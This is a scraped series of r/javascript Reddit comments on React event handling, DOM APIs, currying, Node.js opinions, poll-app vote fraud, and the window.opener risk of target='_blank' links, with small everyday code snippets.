https://github.com/jhusain/eslint-plugin-immutable can help with the "can overlook an update path fairly easily"
Inside the cell component you would have something like: ... handleClick() { this.props.onClick(this.props.item); } return ( &lt;div onClick={this.handleCick}&gt;Cell&lt;/div&gt; ); ... and in the parent: ... onCellClick(item) { doSomething(); } ...
What are notable changes that you made to gain performance?
I agree in the strongest way. I think that JS on the server is going to prove, over time, to have been badly over-hyped and not nearly as universally useful as many people have thought. My primary point of contention these days is how many new-ish devs have been led down the merry path of crazy before they are sophisticated enough to realize how crazy the path really is. NPM and Node do not look like a thriving and vital ecosystem to me anymore: they look broken and full of bubble.
Holy moly thanks guys
I am probably missing something. Can you illustrate it in this sandbox? http://jsfiddle.net/qtvbtLv5/
I would say "The rise and fall of the Full Stack JavaScript Developer". ;-)
This probably isn't the answer you're looking for...but I hate dojo's drag and drop library and tried using html5 drag and drop. Works much better. You can achieve same effect by setting the image shown while dragging with https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API#Define_the_drag_image good luck
Ha!
sweet. some feedback: * it looks professionally designed * breadcrumbs for code? really good idea. 
use `querySelectorAll` then loop through it or maybe foreach works, something like var cName = getCookie('whatever') document.querySelectorAll('#id').forEach(function(elem,idx){ elem.innerHTML = 'foo' + cName }) i might have the `elem,idx` mixed around i forget -_-
I love Node.js, but agree that it is only suitable for certain tasks. I use it primarily for: * server-side rendering of HTML * processing streams and forwarding the response elsewhere * anything that doesn't require too many CPU-bound operations Beyond that, I'd pick a technology that has multithreading at its core. Yes, I know that one can spawn a new event loop with child processes, but I'd rather use an abstraction that manages pooling and synchronisation for me.
 var self = this;
That's why react is getting this hype. It is built for websites with tons of data binding to the DOM.
 var TestApp = React.createClass({ onTestClick (target) { console.log('onTestClick', target); }, render: function () { return (&lt;div onClick={this.onTestClick.bind(this, 'A')}&gt;test&lt;/div&gt;); } }); React.render(&lt;TestApp /&gt;, document.getElementById('app')); http://jsfiddle.net/wcquucak/
I only realised later on that it was an archived version of their site that was being compared. C'est la vie.
There are still people using Angular 1 for new projects. Just not on this subreddit, because everyone here is obsessed with hype.
Thanks ! &gt; "if this software fails we all lose our jobs" This must be a stressful position.
You are mixing file sizes by comparing non-gzipped and gzipped libraries. So none of the numbers makes sense.
Interesting. Looking at the code, it looks like the biggest change is that you rewrote the way data is generated to align reference equality with subdata equality. If I apply your `shouldComponentUpdate` logic using the regular data generator, it either stops updating altogether (when using `ENV.generateData(true)`) because the referential equality assumptions fail, or it keeps the bad performance (when using `ENV.generateData(false)`).
I've never been more proud. ^^Cool ^^App 9 / 7 / 3 - NO 7 / 2 / 29 - NO 2 / 9 / 3 - YES 13 / 8 / 16 - NO 10 / 8 / 15 - NO 10 / 6 / 6 - NO 2 / 10 / 2 - YES 15 / 8 / 13 - NO 3 / 8 / 12 - NO 1 / 6 / 1 - YES
indentation is still weird
Thats true, but since your function relies on a variable in a scope, I cannot think of a better solution.
Coffeescript at negative 71%, really? I fucking love it. These surveys may suffer from the dichotomy between the tools people think they want to use versus the tools they would actually enjoy using. I bet they love TypeScript too, fucking over-engineers.
The one I've posted above works. Instead of binding the variable you pass it down as a prop.
&gt; In JavaScript, functions are objects; that is, functions are of the type Object and they can be used in a manner like any other object since they are in fact objects themselves. Ehh, not sure about this one... Sure, with jQuery `$('.my_class').click(function() {})` is an `instanceof` `'object'`, but calling `typeof` on a normal js function returns `'function'`. Maybe I'm nitpicking, but this is, after all, a topic heavily depending on semantics to properly communicate ideas. 
I'm into a new project that the front end is angular. I'm also sad because I wanted to be using React. 
The one you posted creates an entire React.Component class instance. OP is trying to avoid creating an extra function. What is your point?
You were close. Wrap that console log in an anonymous function. The function being passed to the event listener is called the event handler and it is a callback. v_numone.addEventListener("change", function () { console.log(v_numone.value); }); 
Javascript/DOM has an event-based callback system. `addEventListener` takes a callback function to fire when something happens. What you're doing is passing it the *result* of `console.log(v_numone.value)`. Another thing to know is that for text input fields and textareas the "change" event only fires when the input is de-focused (blur) and the contents have changed. the "input" event fires whenever the value changes...you could also use "keyup" if you need earlier browser support before "input" was commonly implemented [1]: https://jsfiddle.net/6m93hrtb/2/ [1] https://developer.mozilla.org/en-US/docs/Web/Events/input#Browser_compatibility
such logic should be situated in the rest Api part of the application, which is hidden from user.
Hello ðŸ‘‹ Recently, my friend [Chris](https://www.reddit.com/user/Thunder_cats_hoe) and I thought it would be fun to code a simple poll website and record ourselves doing it. In [**part 1**](https://youtu.be/M7g76xnRxmA), I build the server using [Express](http://expressjs.com/), [Sequelize](http://docs.sequelizejs.com/en/latest/), and a few other npm modules including [Babel](https://babeljs.io/) and [ESLint](http://eslint.org/). I also use a variety of Unix tools like [Neovim](https://neovim.io/) and [tmux](https://tmux.github.io/). Then, in [**part 2**](https://youtu.be/nL2wpZV1LYc), Chris picks up where I left off and builds out the front end using [React](https://facebook.github.io/react/), [React Router](https://github.com/reactjs/react-router), a bit of [Bootstrap](http://getbootstrap.com), and of course, [WebPack](https://en.wikipedia.org/wiki/Webpack). His editor of choice is [Atom](https://atom.io/). We called the website &amp;Vote and it's [online](http://www.andvote.com/) right now if you want to check out the final product. The code is also available on [GitHub](https://github.com/andvote/andvote). Aside from having some fun collaborating, Chris and I really just wanted to show people how we work; we wanted to show what tools and techniques we use, how we apply modules like Sequelize and React Router to a real*ish* application, and how we approach certain problems. We've both done some _actual_ live coding on websites like [Twitch](https://www.twitch.tv/dev_coffee) and [livecoding.tv](https://www.livecoding.tv/alexbooker/) before (and will continue to do so). What we've done here is in a similar spirit; we just decided to plan and edit our videos to maintain a more entertaining pace for you. We genuinely hope you find these free screencasts educational and entertaining. Please let us know what you think as we're always looking to improve out content ðŸ˜„. 
Fair enough, what then is your recommendation for determining type? 
While you can't transmute console values, you can have it output a new log each time the input changes. If you're just looking for quick and easy, use angular.js and 2 way data binding. If you need just the basic event trigger, it's *onkeyup*.
So effectively you are moving towards the final element in the path array (incrementally adding with translateX), when you reach that position you a fluctuating around the point because each update is taking you past it then before it. Surely you should be moving toward each element in the path array in turn until you reach it, then start moving onto the next. And you are never updating the y. And with "this.path[x][1] &lt; this.gx" you are comparing the x to the z then you say?
Any software that doesn't have that kind of consequence is basically just a toy :)
how would you implement the following statement within some isomorphic `render()` without revealing the logic or `numClientsConnected`: if (numClientsConnected &gt; 100) var className += " load-high"; it seems like you would need the backend to assemble some single `ViewState` object from the private state/context that had the eventual flags and view pieces needed by the render funcs. And the render funcs just concat what they need from that object into the view template. But this means you would need to extract a lot of it from being inline and abandon some clarity. Do you have an example that works as you're describing?
Dammit, I knew I would mess something up trying to freehand that.
I did. I started on backend wanted to amass as much experience as possible wearing many hats because I would like to found a startup or go into independent contracting in the future.
A function's `prototype` property has no bearing on the function's type. That property is an object that gets assigned to be the prototype of objects it constructs when used with the `new` keyword. You could remove that property from the function and it would still be an instance of Object. var f = function(){}; f.prototype = null; f instanceof Object; //-&gt; true The prototype of a function object is stored in its internal `[[Prototype]]` slot and can be accessed through `Object.getPrototypeOf` or the browser property we should all pretend doesn't exist, `__proto__`. This is the object that determines whether or not a function is an instance of Object or not. This object for function instances is `Function.prototype` which has a `[[Prototype]]` referencing `Object.prototype` which is what allows `instanceof` to identify the function as an instance of Object. If we change the function's `[[Prototype]]` we can change how `instanceof` sees the function. var f = function(){}; Object.setPrototypeOf(f, null); f instanceof Object; //-&gt; false The function is still a function, and still an object in the conventional sense that you can get and set properties from and on it. You've just made it harder to tell.
In addition to the other fine answers, unless you need to support a very old browser (e.g. IE 8), you can use javascript's native array `filter` function. E.g. var result = charactersStar.filter(function (item) { return item.rank &gt;= 43 &amp;&amp; item.rank &lt;= 47; }
[I updated your fiddle](https://jsfiddle.net/6m93hrtb/3/). When you add an event listener, you have to provide a function that handles the event. This function has access to [the event object](https://developer.mozilla.org/en-US/docs/Web/API/Event), so the function has control over what happens. In this case, you want to access the target of the event (the input element) and print its value. Another thing: in general, when you're writing a function, it's better not to use things that weren't explicitly passed to the function as parameters. In this specific example, we could access the v_numone variable directly because it's global, but when you're writing real code this is prone to sneaky lateral effects. ~~You'll notice in my update I only access the event object which was explicitly passed~~ (No, in fact the console object is global). It's not necessary, but as a general practice it saves you headaches with real code. EDIT: See comment below. There are caveats to this comment!
On the other hand it sounds like OP doesn't have enough exposure to what libs are out there to know that there are 1000 others that do the same thing.
First I've heard of these DOM methods. Honestly surprised we haven't had these up until now.
Just an FYI, your comment was caught by the spam filter because you linked livecoding.tv, which has been banned here due to astroturfing/spam. I've unfiltered this comment since you don't look connected to them in any way.
I hated Javascript for a long time. That changed with jQuery (for taming the DOM) and the book Javascript: The Good Parts. Now, I quite enjoy using it, and I've been doing more projects at home in it, both client- and server-side.
Polymer is a framework for creating custom elements (https://www.polymer-project.org/). The project has a default set of elements with material design (https://elements.polymer-project.org/browse?package=paper-elements).
The URL didn't work on the iOS Reddit client, but this one should https://medium.com/@hex13code/lost-in-code-created-tool-for-finding-way-out-700d96ef8c31
&gt; Another thing: in general, when you're writing a function, it's better not to use things that weren't explicitly passed to the function as parameters. This is not good advice. How do you get data into callbacks which you do not invoke yourself besides using a closure (a fundamental javascript construct). Your event handler will only ever fire with the event object passed into it and anything you need to do to handle the event will need access to things outside the handler. In fact, the `console` object you're accessing is global. If your advice was taken then all callbacks not invoked directly by you would be trapped and useless.
[removed]
UI needs additional work, I admit. But I'm open for suggestions. What do you consider unintuitive/cumbersome more precisely? I would like to know so that I can improve that :) 
you should really paste your code, but i'm going to take a blind stab. make div id = 2's click event look like this: $('div#2').click(function(e) { ...your code e.stopPropagation(); } that `e` inside of `function(e)` is needed to pass the event. then the `e.stopPropagation()` will prevent the click event from going into the parent div id = 1. look into event propagation if you want to learn more. event delegation is another thing you can look into after you're done which can be a good solution for dynamic elements.
Sure, why not? Typescript takes like a day to learn if you know JavaScript. 
Cell.js export default class Cell extends React.Component { handleClick () { return this.props.onClick(this.props.item) } render () { return &lt;td onClick={this.handleClick}&gt;Cell&lt;/td&gt; } } Row.js import Cell from './Cell' export default class Row extends React.Component { render () { return &lt;tr&gt;{this.props.items.map(item =&gt; &lt;Cell onClick={this.props.onCellClick} item={item} /&gt; )}&lt;/tr&gt; } }
How will you get numClientsConnected on the frontend in a single page app?
These specifically are trivial to polyfill at least, so you can use them in any browser pretty easily.
Are you me from another universe ? Completely makes sense and this is exactly what I do as well. It's so hard to describe this without going into the entire 'full-stack' discussion. It's really about being able to architect and problem-solve across the stack, maximizing your strengths in particular areas and contributing in meaningful ways in the others as well.
Inserting my obligatory plug for https://github.com/JamieMason/shrinkpack. Grabs the exact tarballs for all your transitive dependencies, puts them in a `./node_shrinkwrap` folder, and rewrites npm-shrinkwrap.json to point to those instead. You check in a few hundred package tarballs that maybe take up a few megs as opposed to trying to commit your entire `node_modules` folder, and get consistent installs on all platforms.
[A graphical representation of CSS.](http://i.imgur.com/Q3cUg29.gif)
Very true. You just need to know prototype and innerHTML for most of them.
Not according to this [Rob Conery video] (30 min)(https://vimeo.com/73913825) . Was your experience different.
That's the issue. I don't want to leak this information to the front end (neither the numClients, nor my threshold). The only thing i care about is that my UI has a "load-high" class based on that condition which is embedded into a view-generating function. To make this work without information leakage you need to create some intermediate object like below which can be used safely on both client and server. var viewState = {load: "high"}; This in turn means that my actual condition (which is still view logic, not business logic) needs to be pulled out of the isomorphic view and into a server-only viewState builder.
I got your point. But as I deal with distributed services I wanted to ensure you can easily put services on different machines, and if doing so you need async calls. If i decide to distribute services and i want to EASILY deploy it on different machines i cant do this with callbacks (since i cant serialize a function, at least no securely, and send over the wire for the other service to call when finish). This way, this framework is not about control flow, yet it is core for the framework. Studio is opinionated and i wanted to make sure programmers are using something reliable to deal with their async code
There's definitely some de facto standards, but ~~nothing~~ *almost nothing* provided 1st party. You could still use your own hand-rolled for any of them, or pick up another solution. This is to contrast it against something like angular, where you get routing provided pretty much no matter what, or meteor, where almost your entire stack is already decided. If it makes you feel any better, I go back and forth on whether or not to call the group "Some assembly required". e: vue is apparently special here.
dashboard.aspx:2 Uncaught SyntaxError: Unexpected token } Guess that means I have something extra in my code? (bear with me)
They are there, just not in the same way. Prepend is pretty clunky: parent.insertBefore(el, parent.firstChild); Append exists: parent.appendChild(el); If appendChild exists why is there append? The new `append` accepts multiple nodes, a single node, a dom string, etc, appendChild only accepts a single node (same with prepend) before and after exist in the form of this odd api: el.insertAdjacentHTML('beforebegin', htmlString); el.insertAdjacentHTML('afterend', htmlString); However, again they accept node, nodes, or html string rather than just a single htmlString (and are not such an odd api) ReplaceWith exists in the form of: el.outerHTML = htmlString; However, again, it only accepts an htmlString vs the new api accepts a node, nodes, or html string. tl;dr they exist in one way or another but were not consistent and none of them accept multiple nodes or html strings (or if they accepted html strings, they did not accept a node) and the new ones are far more jquery style edit: reference http://youmightnotneedjquery.com/
That's what I thought, and that's what I took the 2 to mean. How would I figure that out?
Meteor and DoneJs both have some level of opinion on how the back end part of your server is implemented, with meteor having an opinion on just about everything (up to an including the datastore). The rest of them are fairly agnostic. If you want to get a job where you don't only do front-end stuff, you'll need skills with not-front-end stuff. Pick something up, like flask, ruby on rails, asp.net MVC, etc. In my experience, I get hired as a "web developer", and then I float to where I'm needed more.
Hmm, that's certainly interesting. 
A bug. **Problem:** Co-worker could not vote on poll. **Steps to reproduce:** Create poll. Vote on poll. Share link http://www.andvote.com/v/64 with co-worker on same network. Co-worker gets error in alert: "You have already voted on this poll." 
For Lodash support you should check out its [gitter chat](https://gitter.im/lodash/lodash).
Yup! Or use an existing one like https://github.com/WebReflection/dom4 since generally writing polyfills yourself is a good way to miss some unexpected edge case.
Not we just need `.clear()`!
It's no joke. You don't need a framework. Build components, use components.
The [MDN page for filter](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter) also has a polyfill function that you can use to add the filter function in older browsers. 
Can i ask why? And what kind of project are you working on?
if you're interested, we're also having this discussion here: https://github.com/leeoniya/domvm/issues/67 It's not React, but the problem is one that has to be addressed in any isomorphic design.
Wait until you hear about curried functions then! Functions which return functions which return functions which at any point might accept functions which return functions. let map = mapper =&gt; array =&gt; array.map(mapper); We can describe this function with the notation map :: (a -&gt; b) -&gt; [a] -&gt; [b] Or, a function which accepts a function, which turns an `a` to a `b`, which returns a function which accepts an array of `a`, which returns an array of `b`. If we create a function then which still needs arguments ... // add :: number -&gt; number -&gt; number let add = x =&gt; y =&gt; x + y; And then apply it to our `map` ... // mapAdd :: [number] -&gt; [(number -&gt; number)] let mapAdd = map(add); Or, a function which accepts an array of numbers, and returns an array of functions which return a number when invoked. map(x =&gt; x(5))(mapAdd([2, 3, 4]); &gt; [7, 8, 9] And that's a pretty simple example, too!
Usually these kind of articles are pretty low-quality and effort. This article, however, is quite thorough, and I found it well-written. 
If I knew exactly what I feel is wrong with it, I think I'd be a designer instead of a developer x] Anyway, this is purely my experience of using it, just writing down what goes through my head for the various ui elements. The few buttons above the overview panel-thing, color, I'm not sure what this is for at all. This is Atom, you can change color whenever you want to. The second button, refresh, why and/or when is this necessary? No idea. Indexing, same here. Can't the program decide for itself when it's necessary to index? When do I need to index, every save? The search field is an input element, should be an `&lt;atom-text-editor mini&gt;&lt;/atom-text-editor&gt;` In the project explorer, there's no space after the filename, as a result, the `open` button looks a little weird. Same goes for line of code under the `files` button. The two panels, sidepanel, and the project explorer, are both not resizable. The sidebar listings take up too much vertical space. I think that it would be better to group all "functions" under one "function" heading, all declarations under "declaration" heading and so on... Afterwards, perhaps decrease the padding of each listing so that more fits there. Then, the sidebar's pop-up highlight, the idea is good, but I think it should scroll to the text inside the editor and highlight that instead. Pop-up is more annoying than helpful when the file is open already. There's a button for example to list LOC per file, this could be replaced with a data visualization, it would both be more compact and more useful. I wish this was more than just some incoherent rambling, but hope you get my idea..
Yes, thank you for clarifying. To be clear, it is reasonable to say a function is an Object because Object is in its prototype chain, but 1. it is not accurate to determine that based on the `prototype` property. 1. Object can be removed from the function's prototype chain but it's probably still reasonable to say functions are objects.
 const log = (...args) =&gt; { console.log(args[0]); return args[0]; }
Change it to this: &lt;input type='button' onclick='tableToExcel("selTable_Personal Hygiene Pantry", "Example Table");' value='Excel Export'&gt; But it would be better to use eventListeners 
When I do that the page doesn't even load. How would I go about using eventListeners? It keeps throwing a missing } and I've checked them all.
This is how I'd do it: https://jsfiddle.net/0jz2g4fz/1/ Relevant changes: - More nested markup structure (for less fiddly positioning css). - Use top to position the cursor (not transform). - Use transform to offset the cursor to its vertical middle.
 const log = (...args) =&gt; { console.log(...args); return args[0]; } to console log all arguments instead of the first one
It is pretty strange that the common advice is to throw up a node.js process and let that serve your traffic. Better advice is to put a real webserver (like nginx or apache) in front of it that will spin up a number of node.js processes and deliver traffic to them as required. This way if one crashes, it's just that request that fails.
Thanks! Works perfectly fine now :)
and now we have an ES6 solution. :&gt;
I'll look into it thanks, I think is sort of what /u/hahaNodeJS replied too, I just thought that setting up a server with node running and maybe a framework like sails was all I needed. At least all getting started with Node guides I saw seem to point that. and this statement in the article is wrong? &gt;The advice on the Node.js website is to crash the process if there's an uncaught exception. Our application is about 60 models, 30 controllers; it doesn't seem particularly large. It consistently takes 40 seconds to boot our server in production; the majority of this time is spent requiring files. Obviously we try not to crash, and fix crashes when we see them, but we can't take 40 seconds of downtime because someone sent an input we weren't expecting. I asked about this on the Node.js mailing list but got mostly peanuts. Recently the Go core team sped up build times by 2x in a month. 
Thank you for this video. It was very educational. I always learn so much when I am exposed to otherr peoples coding process. Keep this up, please.
A nitpick without a doubt, but it's unfortunate that an announcement of new ways to do things the right way (the DOM API) comes with an example that does things the wrong way (HTML strings). He should have created a `Text` instead of setting `innerHTML`, or done it implicitly with `append`.
not particularly. I have yet to see somebody who prefers to download a purpose built app to read a page they can access reliably via a browser. I realise the irony of posting this comment via Alien Blue but that's because it offers extra layers. 
`The second button, refresh, why and/or when is this necessary? ` Yeah. You're right. Autorefresh is enabled by default so manual Refresh button should hide itself. Changed. `In the project explorer, there's no space after the filename, as a result, the open button looks a little weird. ` Yeah. Space added :) `The sidebar listings take up too much vertical space. I think that it would be better to group all "functions" under one "function" heading` Updated and now it displays type heading only before the first entity of that type :) `pop-up highlight, the idea is good, but I think it should scroll to the text inside the editor and highlight that instead. Pop-up is more annoying than helpful when the file is open already.` Actually this popup is annoying me too, so I really gonna change this :) First it scrolled as you said (like in Sublime), but I had some technical issues with scrolling editor in Atom API (it's bugged). Anyway every bug can be work around :) `Indexing, same here. Can't the program decide for itself when it's necessary to index? When do I need to index, every save?` You have to index once, when you open the project. Because now indexing is in the same thread which Atom is I don't want to block whole Atom editor without user knowledge (indexing takes on my computer few seconds but it can take longer time). So that's why `Index project` button exists. To manually trigger blocking operation. But soon I'm gonna put indexing in separate thread/process so I'll remove button `index project` because it will be safe to run indexing in background without blocking whole editor. `There's a button for example to list LOC per file, this could be replaced with a data visualization, it would both be more compact and more useful.` Good idea :) some chart would be useful. Thanks for the rest of insights (atom-text-editor, resizing etc.), I'll take a look for the rest too :) 
Depends what they're reading. If it's read frequently and changes infrequently, I usually see people prefer to download it. People download ebooks, reference material, documents they refer to frequently, specs - sometimes they even print them for easier reading.
That was Digital Ocean's intermitence yesterday. It's back up.
You're welcome. I'm really glad you found educational value in the videos.
I have to agree with you there. This isn't something I'm seriously considering, but I imagine a really good way to circumvent abuse would be to force users to login with a service like Twitter before voting. Twitter in particular make it difficult for malicious actors to create multiple accounts by requiring phone verification, among other things. 
Off the top of my head, a couple places I worked with the DOM in something that wasn't client-side code: * Generating forms from metadata (so basically templating, like you said, but done imperatively) * Web scraping * I had some code that would use a template to generate a letter in HTML but a PDF output option was desired and we found a library that would generate PDFs from HTML. But the library expected the body, header, and footer to be three separate HTML pages (with their own stylesheets and all) while the template obviously had those things inline. So I used csquery to split them out into three separate "pages" to satisfy this library. I mean, sure, that's not a ton of DOM manipulation, I guess, but using angular a lot I don't do *that* much DOM manipulation server-side directly either.
I had a good laugh, thanks.
I recently had to build a voting system which could not rely on a login. The method I ended up using was a combination of cookies and storing the user's [browser fingerprint](https://github.com/Valve/fingerprintjs2) in a voting DB table. If the cookie/first security filter allows the vote, the back end checks for the browser fingerprint / IP in the database. Sure a user could switch browsers but to me it seemed like a better solution then just allowing one vote per IP address. The alternative is an [ever cookie](https://github.com/samyk/evercookie) which just seems like a shitty thing to put on someone's machine.
&gt; t experiencing this malware) could you report the app to Lol yeah I reported it to google chrome, both the extension and host site seem down, thanks man!
There are a lot of template solutions out there. If you really like CoffeeScript and want to write your whole project with it, then ECTJS may make sense. CoffeeScript's popularity has lost quite a bit of steam, and I wouldn't expect a lot of major improvements to it, but there's still a community around it, and the language itself is likely to continue to exist in some kind of supported shape for some time. If not, there's probably something else out there just as good for what you need. 
&gt; For instance, Google Docs tries to download into your machine a JavaScript program which measures half a megabyte, in a compacted form that we could call Obfuscript because it has no comments and hardly any whitespace, and the method names are one letter long. The source code of a program is the preferred form for modifying it; the compacted code is not source code, and the real source code of this program is not available to the user. From https://www.gnu.org/philosophy/javascript-trap.html. It's an eye-opening read.
In the end it's all JavaScript. Try writing some small components and learn step by step. For example try to make an accordion or a modal window on your own. Or try to write a simple todo list and when you're finished compare your work to the solutions the guys at todo mvc made. If the vanilla js example was too easy write one in react, angular, vue, etc... http://todomvc.com/
In general it is a good idea though, [pure functions] (https://en.m.wikipedia.org/wiki/Pure_function) are easier to reason about, test, modify and reuse. You don't have to worry about external state, side-effects, or concurrency issues because everything is self contained. They can't be used everywhere but they are very useful. 
I'm not quite understanding what you are asking for. Can you explain in more detail?
Ah that totally makes sense -- the first thing I was introduced to was JSPM, not webpack, so that's why I find myself biased toward it... Yeah -- widespread HTTP2 is going to really shake things up... I'm kind of excited, but also not excited, since rougly 70% of everything I know about optimizing webpages will go out the window, and in the worst case be opposite of what I should be doing.
[removed]
try running it through closure compiler yourself [1] = 848.98KB It is at least 8,490% larger than it could be. [1] https://closure-compiler.appspot.com/home#code%3D%252F%252F%2520%253D%253DClosureCompiler%253D%253D%250A%252F%252F%2520%2540compilation_level%2520SIMPLE_OPTIMIZATIONS%250A%252F%252F%2520%2540output_file_name%2520default.js%250A%252F%252F%2520%2540code_url%2520http%253A%252F%252Fwww.andvote.com%252Fmain.js%250A%252F%252F%2520%253D%253D%252FClosureCompiler%253D%253D
Just had a look at the repo, seems to have only one webpack config file, they may well be using the same thing in production (includes stuff that shouldn't be there like hot-reloading). The point I'm trying to make is that it's not just the framework being used, some of it is to do with the tooling and how it's configured. But to some extent there's always gonna be a size tradeoff if you wanna use cool stuff like e.g. Babel. Maybe Rollup/Webpack 2 tree shaking would get it down to an acceptable size if all else fails.
If you noticed, I did not say "framework", but "enterprisification". I have nothing against thin, fast, modular vdom frameworks, they're great...I built one. The problem is exactly with the insane amount of micro-dependencies, tooling, hot-reloading, packaging, transpilation, Node and NPM dependencies...just to build a simple, but huge and slow polling app for a web browser. My github feed is now filled with 50% "update dependencies" commits and auto-create/delete of branches like "greenkeeper-rollup-stream-1.5.0" by CI/bots and other tools of the trade. The amount of time dedicated to choosing tools, troubleshooting them and then maintaining the entire monster is crazy.
If you look at the amount of actual app code in the repo, it is quite small (as it should be for something this simple). In many cases the choice of framework does introduce a significant perf, tooling and payload cost. So i'm not saying it's *not* frameworks either. certainly it's not all frameworks.
It's first a rest param and then a spread operator, just like ...args is. Not sure if there's a good analogy to .slice(1): doing (...args,...more) is sort of more like curry.apply(null, args.concat(more)); Basically, if the curry function is called on a function of argument length n, and it also includes n arguments, it just runs the functions with all the arguments. Otherwise, it returns a function waiting on some # arguments. Once it gets them, it returns a new curry function that combines any original # of arguments (usually none in this case) with the latest batch, which then all end up as ...args in the new curry function. And so on until the # of arguments qualifies it to run the first path.
*Javascript
I've faced a few issues as well but I've had far less problems with native drag and drop than dojo's drag and drop. Let me know if you know any libraries you'd recommend.
Are you asking why these don't equal? Its because they're two separate requests. Each request gets its own jqXHR object (the return value of $.ajax). Being different objects mean they won't equal each other.
Oh. I shouldn't have asked it that way. I'm actually wondering what is the functional difference between putting the success function inside the $.ajax block vs calling .success (or .done) on the returned object. They seem very similar, but a recent set of specs refused to acknowledge the latter while being happy with the former.
I guess the difference is whether you define the success function at instantiation or later; maybe you need to know something else about the jqXHR object in order to create the success function.
&gt;It requires polyfills even though I'm on Chrome, Ha. I expected it to be way over-engineered but not to that degree. Doesn't surprise me about measuring render performance. I might convert the measurement of that to detect the right number of actual `.comment div`s for Threadit across all implementations, because that's what I ended up doing for Angular 1 anyway. 'stringly typed'--recently I have been seeing this term everywhere and I love it. (The term, that is.) This is exciting me to try out Angular 2 as soon as I can, though I don't expect to like it that much. Thanks for your thoughts. 
last question. you are a genius. is it possible to replace any instance of a phone number in my content? so for instance i have: href="888-888-8888" what if i wanted to replace all instances of 888-888-8888 with a variable that I collected from the URL or cookie with your previous code? is this possible?
so `&lt;a target="_blank" rel="noopener noreferrer" href="#"&gt;mylink&lt;/a&gt;` solves this problem?
Is there an alternative to `window.opener`. For normal links. I'd like to explore passing data/JSON forward via a similar method if it exists.
chrome dev tool,inspect an element and on the right side go to 'computed'
By calling `$window.off('scroll')`, you're remove _all_ scroll handlers. Really, you just want to remove one of them. Instead of this code: $window.on('scroll', function () { didScroll = true; }); Separate it like this: function setDidScroll () { didScroll = true; } $window.on('scroll', setDidScroll); And instead of just calling `$window.off('scroll')`, pass the function in as the second argument like $window.off('scroll', setDidScroll); That should do what you'd like.
I found this, which is close to what i was looking for: http://gojs.net/latest/extensions/Dimensioning.html Though and seems to only be able to dimension canvas elements.
I found this, which is close to what i was looking for: http://gojs.net/latest/extensions/Dimensioning.html Though and seems to only be able to dimension canvas elements.
The success variant used to be the only one back in some old version. Then they made $.ajax returnthe jQuery-bastard-child of Promises, $.Deferred, which is what the .done variant is using. So that style offers some advantages promises have over callbacks, but is not really Promises A+ standard compatible which can cause problems with other promise libs. 
This is only a issue if you let your users create links themselves that use target="_blank". 
What I mean is that after the fork was reconciled, the io.js releases are considered part of the overall node.js history. It says as much on that page. 
Mathias Bynens wrote about this previously in case anyone is interested in an [alternative explaination](https://mathiasbynens.github.io/rel-noopener/). Interestingly, his article makes reference to one of Chris Coyier's entitled [When to use `target="_blank"`](https://css-tricks.com/use-target_blank/) in which he states: &gt; Perhaps you've developed a personal taste for opening all links in new windows/tabs. That's wonderful for you, but it is safe to assume most users are most comfortable with the default behavior. And thus less comfortable with your forcing of a different behavior. Although `target="_blank"` is sometimes necessary, I _suspect_ in some cases the best solution would be to remove it entirely, both from a security _and_ a UX perspective.
I'm interested in at least hearing the idea &amp;mdash; https://github.com/Wildhoney
Any code without an explicit free license is proprietary. 
Or a site you are linking to is compromised
Yeah, [Evercookie](https://github.com/samyk/evercookie) sounds horribly invasive. Disallowing duplicate votes based on the browser fingerprint is totally an option but it's like Greg Malysa pointed out in a [post](http://blog.thelonepole.com/2013/03/preventing-spam-votes-in-online-polls/) linked by /u/NoInkling, there is no silver bullet. 
ive started calling these a collection class, in microsofts-world they are called Iterable classes. BackboneJS and AngularJS have these built in also. It can be worth it, having extra methods built in saves you some time having to code various utility functions: where, whereIdx, fill, dropIdxs, filter, reverse, lastindexOf, etc. Its handy if you need to set multiple props: `datastore.set({id: 123, propA: foo, propB: bar })` Kinda cool imo 
Most of the technically inept at my office open hundreds of new tabs, so I would be curious to see actual data on that topic.
Why add build complexity just save typing `this.`?
`document.body.innerHTML = document.body.innerHTML.replace(/888-888-888/g, "new text")` something like that should work `/g` means global/replace all
build complexity is already on such stupid level so it doesnt really change much. my problem is that this is not nor is going to be a standard in JS releases so if you ever use this plugin and '#' in your classes, you're stuck with babel forever.
Hi /u/aksuta, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
Not really. Just run the transform on your source code, outside of your build system, and then commit the changes made by the transform. It may be ugly, but it's a surefire way to break the Babel dependency.
http://www.reactiongifs.com/r/but-why.gif
I've been building a large app in Aurelia and really enjoying it. It's very straightforward to implement things - never fighting the syntax. I'd recommend it.
Hi! This was an tool I built internally at RetailMeNot to diagnose issues with node modules using the range version hat (`^`) updating its peer dependencies. It should also be useful in `left-pad`-esque fiasco situations. I got it through the open source process, and now it's available to everyone under an MIT license. Please let me know if you have any questions or feature requests, or find any bugs!
Sounds like you want to run it through `JSON.parse()` first var responseObj = JSON.parse(response);
Could this just be a "use the best tool for the job" situations? Can you think of any reason this could be useful? I believe the creator of this is using his own stuff in a trie search algorithm, so maybe that's one.
I already do function myFunction(response) { var response= jQuery.parseJSON(response); alert(response); cal.setData(response); }; pasejson doesn't solve the problem, but another user solved the problem. Now i don't know why the script still doesn't include the data .-. 
One thing's for sure; you're a lot more patient than I am!
Because sometime you have a Chrome-only bug which you'd like to debug, and you're much much more familiar with the Firefox dev tools (or perhaps even they provide some feature you need that Chrome's tools don't). It's not a common case, but there's definitely uses for it. Also: super cool.
Try calling response.replace('"', '') to get a new string with all the double quotes replaced with the empty string. 
both that and var response = new Function("return " + response).call() does work. But now i don't know why if the string i get form the php file is exactly the same as the one i use in the javascript the script doesn't update with those datas Ã§_Ã§ this is my fun function myFunction(response) { var response = response.replace('"', '') alert(response); cal.setData(response); }; where response is : {'04-20-2016' : 'Compleanno','05-14-2016' : 'Compleanno','05-03-2016' : 'Battesimo'} while this is the in-script function cal.setData( {'05-01-2016' : 'testing','05-10-2016' : 'testing2','05-21-2016' : 'testing3'} ); wich works .-. 
yep , i've fixed that, this is not the problem Ã§_Ã§ this is my function function myFunction(response) { var response = response.replace('"', '') alert(response); cal.setData(response); };
You can also use the comma operator: `(console.log(foo), foo)`
Noreferrer messes up your analytics and you can't execute JS. This has been known about for a long time.
...what?? You can do that?
[Yep](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Comma_Operator)
